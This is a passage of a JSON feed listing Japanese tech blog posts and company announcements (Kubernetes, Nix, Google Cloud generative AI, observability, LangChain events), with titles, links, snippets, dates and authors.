2024」に出展","link":"https://sreake.com/blog/developers-x-summit-2024/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）が提供するSRE総合支援サービス「Sreake（スリーク）」は、2024年11月14日(木) に開催される「Developers X Summit 2024」にブース出展することをお知らせします。The post スリーシェイク、「Developers X Summit 2024」に出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-15T01:36:55.000Z","dateMiliSeconds":1728956215000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[Sidecar Containers] Pod Eviction 時のメッセージの改善","link":"https://zenn.dev/toversus/articles/d78254ad757094","contentSnippet":"はじめに先日 Kubernetes で報告されていたバグを修正する PR を送りました。その時に、今後 Kubernetes へのコントリビュートを考えている方の参考になればと思い、どう取り組んだか (Issue の読み解き方やローカル環境での再現、コードの修正、テストの追加などの一通りの流れ) を脳内ダンプして言語化してみました。それを社内向けに共有していたのですが、PR も無事にマージされたので、一部加筆修正して記事として公開します。Issue: [Sidecar Containers] Eviction message should account for the sid...","isoDate":"2024-10-14T07:39:56.000Z","dateMiliSeconds":1728891596000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"スリーシェイク、「Biz/Zine Day 2024 Autumn」に出展","link":"https://sreake.com/blog/biz-zine-day-2024-autumn/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）が提供するSRE総合支援サービス「Sreake（スリーク）」は、2024年10月30日(水) に開催される「Biz/Zine Day 2024 Autumn」にブース出展することをお知らせします。The post スリーシェイク、「Biz/Zine Day 2024 Autumn」に出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-10T01:18:48.000Z","dateMiliSeconds":1728523128000,"authorName":"Sreake","authorId":"Sreake"},{"title":"nix-shellでRを使う","link":"https://blog.atusy.net/2024/10/07/nix-shell-and-r/","contentSnippet":"NixはLinuxやUnix向けのパッケージマネージャーです。nix-env --install Rとしてグローバルに利用可能なRをインストールすることもできますが、nix-shell --package Rして一時的なR環境をbash上に構築することもできます。R本体やパッケージのバージョン指定も可能なので、プロジェクトごとにパッケージのバージョン指定が異なる場合や、グローバル環境にインストールしたパッケージとプロジェクト用パッケージで依存関係が衝突する場合に便利です。","isoDate":"2024-10-07T00:00:00.000Z","dateMiliSeconds":1728259200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"スリーシェイク、Generative AI Summit Tokyo ’24 Fall に協賛","link":"https://sreake.com/blog/generative-ai-summit-tokyo-24-fall/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2024年10月8日（火）にGoogle 渋谷オフィスで開催される「Modern Infra & Apps Summit ’24」 (主催：グーグル・クラウド・ジャパン合同会社) にスポンサーとして協賛し、セッション登壇することをお知らせします。The post スリーシェイク、Generative AI Summit Tokyo ’24 Fall に協賛 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-03T01:12:24.000Z","dateMiliSeconds":1727917944000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ポストCloud9？クラウドIDE CoderでPlatform Engineeringを実践する","link":"https://sreake.com/blog/platform-engineering-with-cloud-ide-coder/","contentSnippet":"はじめに こんにちは、Sreake事業部の志羅山です。 早いものでもう10月。私が住む長野県はもう朝晩の気温は10℃台となり、日中もとても過ごしやすい気候です。振り返ると今年の夏は天気も不安定で、とても暑い夏でしたね・・ […]The post ポストCloud9？クラウドIDE CoderでPlatform Engineeringを実践する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-03T00:44:56.000Z","dateMiliSeconds":1727916296000,"authorName":"Sreake","authorId":"Sreake"},{"title":"BigQuery データキャンバスについて","link":"https://sreake.com/blog/learn-about-bigquery-datacanvas/","contentSnippet":"はじめに こんにちは。Sreake事業部DBREチームのsenoです。10月に入り、暦の上では秋となりました。とはいえ夏の暑さはまだまだ続いておりますね。 最近は、気持ちだけでも秋を感じるために「〇〇の秋」と称して色々や […]The post BigQuery データキャンバスについて first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-02T09:25:24.000Z","dateMiliSeconds":1727861124000,"authorName":"Sreake","authorId":"Sreake"},{"title":"いいぞいいぞと言われるnixをためしてる","link":"https://blog.atusy.net/2024/10/02/trying-nix/","contentSnippet":"NixはLinuxやUnix向けのパッケージマネージャーです。ぱっと5つメリットをあげるとこんなところでしょうか。様々なLinuxディストリビューションやmacOSで使える再現性がありロールバックも可能入れたいパッケージごとに依存関係を独立して管理するので、Aを入れるにはBのバージョンアップが必要みたいな問題が起きない特定のプロジェクト（ディレクトリ）ごとに使うパッケージを変えられる設定ファイルも含めた構成管理ソフトウェアとしても使える最近、スリーシェイクに転職して、職場のPCがmacOSになりました。以前は仕事もプライベートもmanjaro linuxで統一していたのでとりあえずparuを使えばよかったのですが、そうも言ってられないので、Nixを使ってみることにしました。","isoDate":"2024-10-02T00:00:00.000Z","dateMiliSeconds":1727827200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"インテックとスリーシェイク、クラウド事業領域で協業し、ユーザー企業のDXを推進 ～両社の得意分野を活かしたクラウドシフトとモダン開発を実現～","link":"https://sreake.com/blog/intec_3shake/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2024年10月8日（火）にGoogle 渋谷オフィスで開催される「Modern Infra & Apps Summit ’24」 (主催：グーグル・クラウド・ジャパン合同会社) にスポンサーとして協賛し、セッション登壇することをお知らせします。The post インテックとスリーシェイク、クラウド事業領域で協業し、ユーザー企業のDXを推進 ～両社の得意分野を活かしたクラウドシフトとモダン開発を実現～ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T05:01:51.000Z","dateMiliSeconds":1727672511000,"authorName":"Sreake","authorId":"Sreake"},{"title":"DevEXとは","link":"https://sreake.com/blog/devex%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに Developer Experience（DevEx）は「開発者体験」とも呼ばれ、開発者の生産性と満足度を向上させる考え方や取り組みを指す言葉で、近年非常に注目されている概念です。 開発者にとってストレス […]The post DevEXとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T01:35:53.000Z","dateMiliSeconds":1727660153000,"authorName":"Sreake","authorId":"Sreake"},{"title":"DevOpsとは","link":"https://sreake.com/blog/devops%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに DevOpsは、ビジネスのスピードを加速させるために開発(Dev)と運用(Ops)の組織が密に連携するための概念とその手法のことです。 この概念は、技術の導入だけでなく開発プロセスや組織文化全体の変革にも […]The post DevOpsとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T01:35:30.000Z","dateMiliSeconds":1727660130000,"authorName":"Sreake","authorId":"Sreake"},{"title":"オブザーバビリティとは","link":"https://sreake.com/blog/%e3%82%aa%e3%83%96%e3%82%b6%e3%83%bc%e3%83%90%e3%83%93%e3%83%aa%e3%83%86%e3%82%a3%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに 近年、ITシステムの複雑化と大規模化が急速に進み、クラウドネイティブアーキテクチャ、マイクロサービス、コンテナ技術の普及により、システムの構成要素の増加に伴って、その相互依存関係も複雑化しています。 この […]The post オブザーバビリティとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T01:35:09.000Z","dateMiliSeconds":1727660109000,"authorName":"Sreake","authorId":"Sreake"},{"title":"クラウドセキュリティとは","link":"https://sreake.com/blog/%e3%82%af%e3%83%a9%e3%82%a6%e3%83%89%e3%82%bb%e3%82%ad%e3%83%a5%e3%83%aa%e3%83%86%e3%82%a3%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに 近年、企業のIT環境は急速にクラウド化が進んでいます。 クラウドサービスの利用により、柔軟なリソース管理や迅速なサービス展開が可能になり、ビジネスの迅速な立ち上げや、運用効率化、コスト削減などを実現できる […]The post クラウドセキュリティとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T01:34:40.000Z","dateMiliSeconds":1727660080000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Rのヘルプを便利にするfelp v0.6.0をリリース","link":"https://blog.atusy.net/2024/09/27/felp-0-6-0/","contentSnippet":"Rのヘルプを便利にするfelpパッケージのv0.6.0をリリースしました。felpはfunctional helpの略称です。数年前のTokyo.Rでの雑談がきっかけで生まれたパッケージで主に以下の機能があります。","isoDate":"2024-09-27T00:00:00.000Z","dateMiliSeconds":1727395200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"スリーシェイク、Google Cloud 主催の Modern Infra & Apps Summit ’24 に協賛","link":"https://sreake.com/blog/moderninfra_appssummit/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2024年10月8日（火）にGoogle 渋谷オフィスで開催される「Modern Infra & Apps Summit ’24」 (主催：グーグル・クラウド・ジャパン合同会社) にスポンサーとして協賛し、セッション登壇することをお知らせします。The post スリーシェイク、Google Cloud 主催の Modern Infra & Apps Summit ’24 に協賛 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-25T01:11:18.000Z","dateMiliSeconds":1727226678000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Argo CDによるKubernetesマルチテナント構成の検討","link":"https://sreake.com/blog/kubernetes-multi-tenants-by-argo-cd/","contentSnippet":"はじめに はじめまして、スリーシェイクのSreake事業部インターン生の上田です。 私は、SRE技術の調査と研究を行う目的で2024年8月19日~8月30日に開催された2週間のインターンに参加しました。 私はCI/CDパ […]The post Argo CDによるKubernetesマルチテナント構成の検討 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-24T22:18:20.000Z","dateMiliSeconds":1727216300000,"authorName":"Sreake","authorId":"Sreake"},{"title":"クリアファイルで財布に入るキーケースを作った","link":"https://blog.atusy.net/2024/09/21/handmade-keycase/","contentSnippet":"昨日の記事で紹介したhmnyのコンパクト財布に入るキーケースを作りました。クリアファイルを加工しているので薄くて軽くて丈夫です。逆さにして振っても鍵が落ちてこない絶妙なホールド力も実現。ハンドメイドなので、自分の鍵にサイズを合わせられるメリットが活きています。自宅と自転車の鍵が入ります。間にはマスキングテープでスマートタグのTileを貼りつけています。これで最低限必要な鍵は財布と共に持ち歩けます。トラッキングも鍵と財布で分けずに一元化できます。空の状態はこんな感じ。クリアファイルから必要なサイズを切り取って、鍵の形に合わせて溶着しています。クリアファイルはポリプロピレン製で230度～280度の温度で溶着できるとのことだったので、温度調整機能つきのはんだごてを270度に設定して使いました。こて先が広めな面状のものを使うと、もう少し仕上がりがよかったかもしれません。","isoDate":"2024-09-21T00:00:00.000Z","dateMiliSeconds":1726876800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"hmny casualのコンパクト財布を買った","link":"https://blog.atusy.net/2024/09/20/hmny-wallet/","contentSnippet":"10年以上、アブラサスの旅行財布を使っていましたが、この度、hmny casualのコンパクト財布に買い替えました。写真はやや青みがかかってますが、実際には黄緑に近い色です。皺の入りかたは個体差があり、1つと同じ商品がないところもステキ。","isoDate":"2024-09-20T00:00:00.000Z","dateMiliSeconds":1726790400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Google Cloud で生成 AI アプリを評価するアーキテクチャパターン","link":"https://zenn.dev/kimitsu/articles/google-cloud-gen-ai-eval-arch","contentSnippet":"用語について オンライン評価とオフライン評価評価はそのタイミング、やり方によってオンライン評価とオフライン評価に分けられます。オンライン評価とは、システムやモデルが実際の運用中にリアルタイムで評価される手法です。オフライン評価は、事前に用意されたデータセットを使用し、システムやモデルの性能をテスト環境で評価する方法です。生成 AI アプリケーションの場合には、オンライン評価は実際のユーザが生成 AI を利用した際の入出力に対して評価を行います。特徴としては、模範解答を用意することができないため生成 AI による評価（LLM as a Judge）をします。オフライン評...","isoDate":"2024-09-15T13:36:11.000Z","dateMiliSeconds":1726407371000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google Cloud でのプロンプト管理は Vertex AI Studio を使おう","link":"https://zenn.dev/kimitsu/articles/google-cloud-temporary-prompt-version-management","contentSnippet":"背景Google Cloud では Google Cloud Next \'24 にて Vertex AI Studio の Prompt Version Management とその SDK Support が発表されました。[1]将来的には Google Cloud におけるプロンプト管理はこの機能を使うことになると思われますが、本記事執筆時点では SDK Support は公開されていません。そのため現時点で Google Cloud でプロンプトを管理するのにどのサービスを使うべきか検討した結果を共有します。検討にあたっては以下の観点を考慮しました。バージョン管理機...","isoDate":"2024-09-14T15:52:30.000Z","dateMiliSeconds":1726329150000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Platform Engineering の視点から考える、Kubernetes Load Balancing の比較","link":"https://sreake.com/blog/kubernetes-load-balancing-comparison-on-platform-engineering-view-point/","contentSnippet":"自己紹介 井上 裕介 千葉工業大学 情報科学部 情報工学科 学部4年の井上裕介と申します。大学では主に遺伝的アルゴリズムの改良に関する研究を行っています。2023年のサマーインターンから引き続きSreake事業部にて技術 […]The post Platform Engineering の視点から考える、Kubernetes Load Balancing の比較 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-13T02:59:01.000Z","dateMiliSeconds":1726196341000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、 Google Cloud Partner Advantage プログラムにおいて「DevOps – サービス」のスペシャライゼーション認定を取得","link":"https://sreake.com/blog/google-cloud-partner-advantage-devops/","contentSnippet":"Google Cloud Sell および Service エンゲージメントモデルのプレミアパートナーである株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、Google Cloud Partner Advantage プログラムにおいて、「DevOps - サービス」のスペシャライゼーション認定を取得したことをお知らせします。The post スリーシェイク、 Google Cloud Partner Advantage プログラムにおいて「DevOps – サービス」のスペシャライゼーション認定を取得 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-13T01:00:00.000Z","dateMiliSeconds":1726189200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AIを用いたOCR","link":"https://shu-kob.hateblo.jp/entry/2024/09/11/223456","contentSnippet":"OCRとは、Optical Character Recognitionの略で、日本語では光学文字認識といいます。OCRとは何か？OCRは、スキャンした書類や画像に含まれる文字を、コンピュータが読み取り、テキストデータに変換する技術です。つまり、紙に書かれた文字をデジタルの文字に変えて、パソコンで編集したり、検索したりできるようにするものです。OCRの仕組み画像の取り込み: スキャナーやデジタルカメラで、文字が書かれた紙の画像を撮影します。画像の前処理: 画像のノイズ除去や歪みの修正など、文字認識を円滑に行うための処理を行います。文字の切り出し: 画像から文字を一つずつ切り出します。文字の認識: 切り出した文字を、事前に登録された文字のパターンと照合し、どの文字か判定します。テキストデータへの変換: 認識された文字を、テキストデータに変換します。OCRの活用例書類のデジタル化: 紙の書類をスキャンしてテキストデータに変換することで、電子化し、保管や検索を効率化できます。データ入力の自動化: 請求書や領収書などの文字情報を自動的に読み込むことで、データ入力の手間を大幅に削減できます。検索の効率化: テキストデータに変換された文書は、キーワード検索が可能になり、必要な情報に素早くアクセスできます。翻訳: OCRでテキストデータに変換した後に、翻訳ソフトウェアを使って他の言語に翻訳することができます。OCRのメリット作業の効率化: 手作業でのデータ入力に比べて、大幅に作業時間を短縮できます。正確性の向上: 人による入力ミスを減らすことができ、データの正確性を高めます。コスト削減: 人件費の削減につながります。ペーパーレス化: 紙の書類を電子化することで、保管スペースを削減し、環境にも優しいです。OCRの種類OCRには、大きく分けて以下の2種類があります。OCRエンジン: ソフトウェア開発者が、OCR機能を自社のアプリケーションに組み込むために利用するソフトウェアです。OCRサービス: クラウド上で提供されるOCR機能で、APIなどを利用して簡単にOCR機能を導入できます。OCRの選び方OCRを選ぶ際には、以下の点に注意しましょう。認識精度: どの程度の精度で文字を認識できるか。対応言語: どの言語に対応しているか。対応フォント: どのフォントに対応しているか。対応ファイル形式: どのファイル形式に対応しているか。価格: 有料か無料か、料金体系はどうか。AIを用いたOCRcloud.google.comGoogle CloudなどパブリッククラウドでOCR機能が提供されています。Geminiで使用することもできます。OCRの活用の幅が広がり、工数削減に役立ちそうですね。まとめOCRは、紙の文書をデジタル化し、業務効率化に貢献する便利な技術です。様々な分野で活用されており、今後もその重要性はますます高まっていくでしょう。","isoDate":"2024-09-11T13:34:56.000Z","dateMiliSeconds":1726061696000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Apple Intelligence触ってみたい","link":"https://shu-kob.hateblo.jp/entry/2024/09/10/235654","contentSnippet":"k-tai.watch.impress.co.jpiPhone16で、Apple Intelligenceという名の生成AIが搭載されるようですね。Xなどではいまいち、盛り上がりに欠けているものの、生成AIを生業にするものとしては、触ってみたいです。Google PixelがGeminiを搭載したAIスマホとして売り出されていますが、iPhone・Apple Watch・Macユーザとしては、引き続きiPhoneですかね。Geminiは好きなので、Google Pixel欲しい気もしますがww","isoDate":"2024-09-10T14:56:54.000Z","dateMiliSeconds":1725980214000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"GKE Observabilityツール – Cloud Service MeshとCiliumの比較","link":"https://sreake.com/blog/cloud-service-mesh-cilium-comparison/","contentSnippet":"はじめに extended Berkley Packet Filter (eBPF) は、Linuxのカーネルに組み込まれた技術で、カーネルに直接変更を加えることなくプログラムを安全にカーネル内で実行することを可能にしま […]The post GKE Observabilityツール – Cloud Service MeshとCiliumの比較 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-09T04:55:11.000Z","dateMiliSeconds":1725857711000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Cloud MonitoringおよびCloud Loggingを用いた監視とアラート通知","link":"https://sreake.com/blog/monitoring-and-alerting-with-cloud-monitoring-and-cloud-logging/","contentSnippet":"はじめに はじめまして。Sreake事業部インターン生の高島です。2023年10月から長期インターン生としてKubernetes関連技術の習得とSRE技術の調査・検証を行っています。普段は、情報系の大学院生で、数値解析に […]The post Cloud MonitoringおよびCloud Loggingを用いた監視とアラート通知 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-09T01:05:46.000Z","dateMiliSeconds":1725843946000,"authorName":"Sreake","authorId":"Sreake"},{"title":"生成 AI アプリで収集するべきテレメトリは何か","link":"https://zenn.dev/kimitsu/articles/gen-ai-telemetry","contentSnippet":"2024 年現在、生成 AI のアプリケーションへの応用が進んでおり^{[要出典]}、運用のためのツールやサービスが登場しています。生成 AI 専用のサービスとしては LangSmith と Langfuse が有名で、それぞれモデルへの入出力やトレースなどを取ることができます。監視 SaaS である Datadog でも LLM Observability の機能がリリースされています。また先月末には Google Cloud のブログにて GenOps についての記事が投稿され、その中でロギングや評価についての記載もありました。https://cloud.google.com...","isoDate":"2024-09-08T03:11:06.000Z","dateMiliSeconds":1725765066000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google の提唱する GenOps って何？","link":"https://zenn.dev/kimitsu/articles/what-is-genops","contentSnippet":"2024 年 8 月 31 日に Google Cloud のブログにて「GenOps: learning from the world of microservices and traditional DevOps」という記事が投稿されました。https://cloud.google.com/blog/products/devops-sre/genops-learnings-from-microservices-and-traditional-devopsこれまでも LangSmith や Langfuse といった LLMOps ツールや Datadog の LLM Observ...","isoDate":"2024-09-07T07:59:59.000Z","dateMiliSeconds":1725695999000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"生成AIにおけるベクトルインデックス","link":"https://shu-kob.hateblo.jp/entry/2024/09/06/234850","contentSnippet":"生成AIにおけるベクトルインデックス：詳細解説ベクトルインデックスとは？ベクトルインデックスは、生成AIにおいて、テキスト、画像、音声などの非構造化データを、数値のベクトルに変換し、そのベクトル間の類似度に基づいて検索や推薦を行うための技術です。なぜベクトルに変換するのか？意味の理解: 単語の並びだけでなく、単語間の関係性や文脈を数値として表現することで、コンピュータがより深くテキストの意味を理解できるようになります。高速な検索: 高次元空間上のベクトル間の距離を計算することで、従来のキーワード検索よりも高速かつ正確に類似したデータを検索できます。多様なデータの統合: テキストだけでなく、画像や音声などもベクトルに変換することで、異なる種類のデータを統一的に扱うことができます。ベクトルインデックスの仕組みベクトル化: テキストや画像などを、ニューラルネットワークなどのモデルを用いて数値のベクトルに変換します。インデックス作成: 変換されたベクトルを、効率的に検索できるようにインデックスを作成します。ベクトル検索: ユーザーのクエリをベクトル化し、作成されたインデックスから最も類似したベクトルを検索します。ベクトルインデックスの活用事例検索エンジン: キーワードだけでなく、文章の意味に基づいたより精度の高い検索を実現します。推薦システム: ユーザーの興味関心に基づいた商品やコンテンツを推薦します。チャットボット: ユーザーの質問に対して、より自然な回答を生成します。画像検索: 画像の内容に基づいた検索や、類似画像の検索を行います。ベクトルインデックスのメリット高精度な検索: キーワードマッチングだけでなく、意味に基づいた検索が可能になります。柔軟なデータ処理: テキストだけでなく、画像や音声など、様々な種類のデータを扱えます。スケーラビリティ: 大量のデータを効率的に処理できます。ベクトルインデックスの課題次元数の呪い: 高次元空間での計算コストが大きくなることがあります。モデルの選択: どのモデルを用いてベクトルに変換するかが、性能に大きく影響します。解釈の難しさ: ベクトル表現が抽象的であり、人間が直感的に理解することが難しい場合があります。今後の展望ベクトルインデックスは、生成AIのさらなる発展に不可欠な技術です。より大規模なデータセットへの対応、より高精度なベクトル化モデルの開発、そして、ベクトル表現の解釈に関する研究が進められていくことが期待されます。具体的な活用事例eコマース: ユーザーの過去の購入履歴や検索履歴に基づいた商品推薦カスタマーサポート: チャットボットによるFAQ検索や、ユーザーの問い合わせに対する自動応答医療: 医療論文の検索や、診断支援金融: リスク評価や不正検知まとめベクトルインデックスは、生成AIの性能を飛躍的に向上させるための重要な技術です。様々な分野での応用が期待されており、今後もその重要性はますます高まっていくでしょう。さらに詳しく知りたい場合は、以下のキーワードで検索してみてください。ベクトルデータベースベクトル検索自然言語処理機械学習ニューラルネットワーク何か他に聞きたいことがあれば、お気軽にご質問ください。より具体的な質問の例:特定のベクトルデータベースについて詳しく知りたいベクトルインデックスを構築する際の注意点ベクトルインデックスを生成AIの開発にどのように活用できるかこれらの質問に対して、より詳細な情報を提供できます。","isoDate":"2024-09-06T14:48:50.000Z","dateMiliSeconds":1725634130000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run GPU + Ollama gemma2 のパフォーマンスを図ってみる","link":"https://zenn.dev/satohjohn/articles/912b4c718a8d74","contentSnippet":"概要Google Cloud 上で申請することで、Cloud Run GPU が使えるようになったので実行してみます。https://cloud.google.com/run/docs/configuring/services/gpu?hl=ja申請フォームGoogle Cloud では以下のように、サンプルが載っているので一旦それの通りの沿って、Gemma2 を起動するアプリケーションを作成します。https://cloud.google.com/run/docs/tutorials/gpu-gemma2-with-ollama?hl=jaとはいえ、それだけだとそのまま...","isoDate":"2024-09-06T08:31:03.000Z","dateMiliSeconds":1725611463000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Scala アプリケーションのビルドを改善してデプロイ時間を 1/4 にした話 | How I improved the build of my Scala application and reduced deployment time by 4x","link":"https://speakerdeck.com/nomadblacky/scala-ahurikesiyonnohirutowogai-shan-sitetehuroishi-jian-wo-1-4-nisitahua-how-i-improved-the-build-of-my-scala-application-and-reduced-deployment-time-by-4x","contentSnippet":"2024/09/06 Scalaわいわい勉強会 #3\\rhttps://scala-tokyo.connpass.com/event/325327/","isoDate":"2024-09-06T04:00:00.000Z","dateMiliSeconds":1725595200000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"2024年版 運用者たちのLLM","link":"https://speakerdeck.com/nwiizo/2024nian-ban-yun-yong-zhe-tatinollm","contentSnippet":"Cloud Operator Days 2024 クロージングイベント\\rhttps://cloudopsdays.com/closing/\\r\\rとても、端的に言うと「プロンプトエンジニアリングをしよう」って話。\\rこの発表資料は、LLM（大規模言語モデル）によるIT運用の可能性と課題を探っています。AIOpsの概念を基に、LLMがインシデント対応、ドキュメンテーション、コード分析などの運用タスクをどのように改善できるかを説明しています。同時に、LLMの「幻覚」や不完全性といった課題も指摘し、適切な利用方法やプロンプトエンジニアリングの重要性を強調しています。\\r\\r登壇時ブログ\\rhttps://syu-m-5151.hatenablog.com/entry/2024/09/06/154607","isoDate":"2024-09-06T04:00:00.000Z","dateMiliSeconds":1725595200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Anker Soundcore Space A40を買った（True wireless earphone）","link":"https://blog.atusy.net/2024/09/06/anker-soundcore-a40/","contentSnippet":"Anker Soundcore Space A40を買いました。https://www.ankerjapan.com/products/a3936前から使ってみたかったところに、Amazonのセールで￥12,990 -> ￥8,990と安くなってたので、購入を決意。対抗馬は横向きで寝ててても使いやすいっぽい Anker Soundcore Sleep A20 でした。ただ、Sleep A20はセールしていなかったのと、私が寝るときはだいたい寝る時は仰向けスタートなので、Space A40でよかろうと判断。","isoDate":"2024-09-06T00:00:00.000Z","dateMiliSeconds":1725580800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"zfをline-wise化して直感的な挙動にするマッピング","link":"https://blog.atusy.net/2024/09/06/linewise-zf/","contentSnippet":"zfがline-wiseに作用するようnnoremap zf zfVやvnoremap <expr> zf mode() ==# \'V\' ? \'zf\' : \'Vzf\'しとくと便利","isoDate":"2024-09-06T00:00:00.000Z","dateMiliSeconds":1725580800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Google Cloud Gemini向けの生成AIのプロンプトエンジニアリング","link":"https://shu-kob.hateblo.jp/entry/2024/09/05/235035","contentSnippet":"cloud.google.com生成AIのプロンプトエンジニアリングは様々な手法がありますが、Gemini for Google Cloudなんて出ているのですね。Google Cloud のプロダクトとサービスに関しては、Geminiは学習済のようで、詳しいようです。読んで勉強したいと思います。","isoDate":"2024-09-05T14:50:35.000Z","dateMiliSeconds":1725547835000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Mini-Omni OSSでSpeech-to-Speechができるようになる？","link":"https://shu-kob.hateblo.jp/entry/2024/09/04/233919","contentSnippet":"arxiv.orgGPT-4oの進化系で、リアルタイム音声会話のできる生成AIがOSSで出たようです。github.comその名もMini-Omni。小型モデルでどうリアルタイム音声会話を実現したのか興味深いですね。生成AIでリアルタイム音声会話は難しく、Speech-to-Text-to-Speechという変換手順を踏む必要があり、時間がかかっていたところ、リアルタイム、つまりSpeech-to-Speechで早く処理できるようになった、ということですね。ぜひ論文を読んでみたいと思います。以下、AbstractをGeminiで訳してみました。（OpenAIちゃうんかいw）言語モデルの進歩とMini-Omni言語モデルの最近の進歩は、大きな成果を上げています。GPT-4oは新たなマイルストーンとして、人間とのリアルタイム会話が可能となり、人間に近い自然な流暢さを示しています。このような人間とコンピュータのインタラクションを実現するには、音声モダリティで直接推論を行い、ストリーミングで出力生成できるモデルが必要となります。しかし、これは現在の学術的なモデルではまだ実現できていません。これらのモデルは通常、音声合成のために追加のTTSシステムに依存しており、望ましくない遅延が生じます。本論文では、リアルタイム音声インタラクションが可能なオーディオベースのエンドツーエンド会話モデルであるMini-Omniを紹介します。この機能を実現するために、テキスト指示による音声生成方法と、推論時のバッチ並列戦略を提案しています。この手法は、元のモデルの言語能力を最小限の劣化で保持するのに役立ち、他の研究がリアルタイムインタラクション機能を確立できるようにします。このトレーニング方法を「Any Model Can Talk」と呼んでいます。また、音声出力を最適化したモデルをファインチューニングするためのVoiceAssistant-400Kデータセットも紹介します。私たちの知る限り、Mini-Omniはリアルタイム音声インタラクションのための最初の完全なエンドツーエンド、オープンソースモデルであり、今後の研究に貴重な可能性を提供します。","isoDate":"2024-09-04T14:39:19.000Z","dateMiliSeconds":1725460759000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloudの生成AIサンプルアプリEnterprise Knowledge Solution (EKS)","link":"https://shu-kob.hateblo.jp/entry/2024/09/03/235705","contentSnippet":"github.comGoogle Cloudの生成AIサンプルアプリ「Enterprise Knowledge Solution」 (EKS)がGitHubで公開されています。EKSはAmazon Elastic Kubernetes Serviceと紛らわしい（苦笑）「Enterprise Knowledge Solution」 はIAPとCloud RunベースでUI付きの生成AIアプリケーションをさっとデプロイできるようです。私はまだ試せていないですが、是非とも触ってみたいですね。terraformでデプロイできる模様。これは面白そう。コードも参考になりそうですね。","isoDate":"2024-09-03T14:57:05.000Z","dateMiliSeconds":1725375425000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChain Meetup Tokyo #2に登壇し、LangChainでWebサイトの内容取得やGitHubソースコード取得、というタイトルで発表しました","link":"https://shu-kob.hateblo.jp/entry/2024/09/02/224106","contentSnippet":"langchain.connpass.comLangChain Meetup Tokyo #2に登壇してきました。私は「LangChainでWebサイトの内容取得やGitHubソースコード取得」というタイトルで発表しました！次は @shu_kob によるLangChainでWebサイトの内容取得やGitHubソースコード取得\uD83D\uDC4F #LangChainJP pic.twitter.com/ryvFxqv6M1— こぎそ | Algomatic (@kgsi) 2024年9月2日   写真撮っていただけてました。ありがとうございます。ChatGPT/LangChainによるチャットシステム構築［実践］入門作者:吉田 真吾,大嶋 勇樹技術評論社Amazon「ChatGPT/LangChainによるチャットシステム構築［実践］入門」の著者、吉田 真吾さん、大嶋 勇樹さんにもお会いできました。お二人の会社、株式会社ジェネラティブエージェンツのCEO西見公宏さんにもお会いでき、コロッケそばさん、技術者としてステキ‼️ #langchainjp pic.twitter.com/N1GE4ArjJ0— \uD835\uDE4E\uD835\uDE5D\uD835\uDE5E\uD835\uDE63\uD835\uDE5C\uD835\uDE64 吉田真吾 (@yoshidashingo) 2024年9月2日   65歳で登壇されたコロッケそばさんかっこよかったです！ 